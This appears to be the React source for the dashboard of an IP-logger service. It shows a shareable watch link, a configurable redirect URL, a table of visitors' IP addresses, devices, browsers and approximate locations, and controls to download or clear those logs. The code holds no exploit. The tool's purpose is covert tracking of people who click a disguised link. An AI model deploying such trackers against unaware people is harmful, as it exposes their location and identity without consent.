import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import axios from "axios";
import { data } from "../components/config"; 
import { Copy, Edit3, Eye, Download, Trash2, Loader2 } from "lucide-react"; 
import { EmbedSection } from "../components/EmbedSection";

interface Log {
  _id: string;
  IP_Address: string;
  UserAgent: string;
  device: string;
  os: string;
  browser: string;
  method: string;
  endpoint: string;
  date: string;
  location: { country: string | null; region: string | null; city: string | null };
}

interface LoggerData {
  _id: string;
  redicertUrl: string;
  Logs: Log[];
  createdAt: string;
}

export default function Watcher() {
  const { id } = useParams();
  const [logger, setLogger] = useState<LoggerData | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [editUrl, setEditUrl] = useState("");
  const [saving, setSaving] = useState(false);
  const [deleting, setDeleting] = useState(false);
  const [downloading, setDownloading] = useState(false);

  const fetchLogger = async () => {
    if (!id) return;
    setLoading(true);
    setError("");
    try {
      const res = await axios.post(
        `${data.api}/api/logger/get`,
        { loggerId: id },
        { withCredentials: true }
      );
      setLogger(res.data.message);
      setEditUrl(res.data.message.redicertUrl);
    } catch (err: any) {
      setError(err.response?.data?.message || "Something went wrong");
    }
    setLoading(false);
  };

  useEffect(() => {
    fetchLogger();
    const interval = setInterval(fetchLogger, 30000); 
    return () => clearInterval(interval);
  }, [id]);

  const handleSaveUrl = async () => {
    if (!logger) return;
    if (!editUrl) {
      setError("Redirect URL is required.");
      return;
    }
    setSaving(true);
    setError("");
    try {
      await axios.post(
        `${data.api}/api/logger/edit`,
        { loggerId: logger._id, redicertUrl: editUrl },
        { withCredentials: true }
      );
      setTimeout(() => fetchLogger(), 500);
    } catch (err: any) {
      setError(err.response?.data?.message || "Failed to update URL");
    }
    setSaving(false);
  };
  
  const handleDownloadLogs = () => {
    if (!logger || logger.Logs.length === 0) {
      setError("No logs to download.");
      return;
    }
    setDownloading(true);
    const jsonString = JSON.stringify(logger.Logs, null, 2);
    const blob = new Blob([jsonString], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `logger_${logger._id}_logs.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    setDownloading(false);
  };
  
  const handleDeleteLogs = async () => {
    if (!logger) return;
    if (!window.confirm("Are you sure you want to delete ALL logs for this tracker? This action cannot be undone.")) {
      return;
    }
    setDeleting(true);
    setError("");
    try {
      await axios.post(
        `${data.api}/api/logger/clearlogs`,
        { loggerId: logger._id },
        { withCredentials: true }
      );
      setTimeout(() => fetchLogger(), 500);
    } catch (err: any) {
      setError(err.response?.data?.message || "Failed to clear logs.");
    }
    setDeleting(false);
  };

  if (loading) return <div className="min-h-screen bg-gray-900 text-white flex justify-center items-center"><div className="text-xl font-medium">Logger Loading...</div></div>;
  if (error) return <div className="min-h-screen bg-gray-900 text-red-400 flex justify-center items-center p-6 text-xl font-medium">{error}</div>;
  if (!logger) return <div className="min-h-screen bg-gray-900 text-white flex justify-center items-center p-6 text-xl font-medium">Logger not found.</div>;

  return (
    <div className="min-h-screen bg-gray-900 text-white flex flex-col items-center py-10 px-4 space-y-8">
      
      <div className="w-full max-w-6xl bg-gray-800/90 border border-gray-700 rounded-2xl shadow-2xl p-6 flex flex-col md:flex-row md:justify-between md:items-center gap-6">
        <div>
          <h1 className="text-3xl font-extrabold text-indigo-400 mb-1">Logger ID: <span className="text-white font-mono text-xl select-all">{logger._id}</span></h1>
          <p className="text-gray-500 text-sm mt-1">Created At: {new Date(logger.createdAt).toLocaleString()}</p>
          <p className="text-sm text-gray-400 mt-1 font-semibold">Total Logs: <span className="text-indigo-300">{logger.Logs.length}</span></p>
        </div>
        
        <div className="flex flex-col gap-2 items-end">
          <label className="text-sm text-gray-400 font-medium w-full text-left">Redirect URL:</label>
          <div className="flex gap-2 items-center w-full">
            <input
              type="text"
              value={editUrl}
              onChange={(e) => setEditUrl(e.target.value)}
              placeholder="https://example.com/redirect"
              className="bg-gray-900/50 px-3 py-2 rounded-lg w-full border border-gray-700 focus:border-purple-500 focus:ring-2 focus:ring-purple-500/30 outline-none text-white transition"
            />
            <button
              onClick={handleSaveUrl}
              disabled={saving}
              className="bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 px-4 py-2 rounded-lg font-medium text-white flex items-center gap-2 shadow-lg transition duration-150 transform active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {saving ? <Loader2 className="h-4 w-4 animate-spin"/> : <Edit3 className="h-4 w-4"/>} {saving ? "Saving..." : "Save"}
            </button>
          </div>
        </div>
      </div>
      
      <div className="w-full max-w-6xl flex flex-col md:flex-row gap-4">
        <div className="flex-1 bg-gray-800/70 border border-gray-700 rounded-xl p-4 flex items-center gap-3 shadow-xl">
          <span className="text-indigo-300 font-bold flex items-center gap-2 shrink-0"><Eye className="h-5 w-5"/> Watch URL:</span>
          <input
            type="text" title="X"
            readOnly
            value={`${window.location.origin}/x/${logger._id}`} 
            className="bg-gray-900/60 text-white px-3 py-2 rounded-lg flex-1 cursor-pointer select-all font-mono text-sm w-full min-w-0"
            onClick={() => navigator.clipboard.writeText(`${window.location.origin}/x/${logger._id}`)}
          />
          <button
            onClick={() => navigator.clipboard.writeText(`${window.location.origin}/x/${logger._id}`)}
            className="bg-indigo-600 hover:bg-indigo-500 px-4 py-2 rounded-lg text-white font-medium flex items-center gap-1 shadow-md transition duration-150 shrink-0"
          >
            <Copy className="h-4 w-4"/> Copy
          </button>
        </div>
        
        <div className="flex gap-4 p-4 bg-gray-800/70 border border-gray-700 rounded-xl shadow-xl">
          <button
            onClick={handleDownloadLogs}
            disabled={logger.Logs.length === 0 || downloading}
            className="bg-emerald-600 hover:bg-emerald-700 px-4 py-2 rounded-lg text-white font-medium flex items-center gap-2 shadow-md transition duration-150 disabled:opacity-50"
          >
            {downloading ? <Loader2 className="h-4 w-4 animate-spin"/> : <Download className="h-4 w-4"/>} Download JSON
          </button>
          <button
            onClick={handleDeleteLogs}
            disabled={logger.Logs.length === 0 || deleting}
            className="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-lg text-white font-medium flex items-center gap-2 shadow-md transition duration-150 disabled:opacity-50"
          >
            {deleting ? <Loader2 className="h-4 w-4 animate-spin"/> : <Trash2 className="h-4 w-4"/>} Clear All Logs
          </button>
        </div>
      </div>
      
      <div className="w-full max-w-6xl overflow-x-auto bg-gray-800/80 border border-gray-700 rounded-xl shadow-lg">
        <table className="w-full text-left border-collapse">
          <thead className="bg-gray-700 sticky top-0 z-10 text-sm">
            <tr>
              <th className="px-3 py-3 border border-gray-600/50 font-semibold text-indigo-300">#</th>
              <th className="px-3 py-3 border border-gray-600/50 font-semibold text-indigo-300">IP Address</th>
              <th className="px-3 py-3 border border-gray-600/50 font-semibold text-indigo-300">Device</th>
              <th className="px-3 py-3 border border-gray-600/50 font-semibold text-indigo-300">Browser</th>
              <th className="px-3 py-3 border border-gray-600/50 font-semibold text-indigo-300">Location</th>
              <th className="px-3 py-3 border border-gray-600/50 font-semibold text-indigo-300">Date</th>
            </tr>
          </thead>
          <tbody>
            {logger.Logs.length === 0 ? (
              <tr>
                <td colSpan={6} className="text-center py-4 text-gray-400">No logs recorded yet. Embed the code to start tracking!</td>
              </tr>
            ) : (
              logger.Logs.slice().reverse().map((log, i) => ( 
                <tr key={log._id} className="text-xs even:bg-gray-900/50 hover:bg-gray-700 transition-colors duration-200">
                  <td className="px-3 py-2 border border-gray-600/50 text-gray-500">{logger.Logs.length - i}</td>
                  <td className="px-3 py-2 border border-gray-600/50 font-mono">{log.IP_Address}</td>
                  <td className="px-3 py-2 border border-gray-600/50">{log.device} ({log.os})</td>
                  <td className="px-3 py-2 border border-gray-600/50">{log.browser}</td>
                  <td className="px-3 py-2 border border-gray-600/50 text-yellow-300/80">
                    {log.location.city || "?"}, {log.location.country || "Unknown"}
                  </td>
                  <td className="px-3 py-2 border border-gray-600/50 text-gray-400">{new Date(log.date).toLocaleString()}</td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>
      
      <EmbedSection loggerId={logger._id} apiUrl={data.api}/>
    </div>
  );
}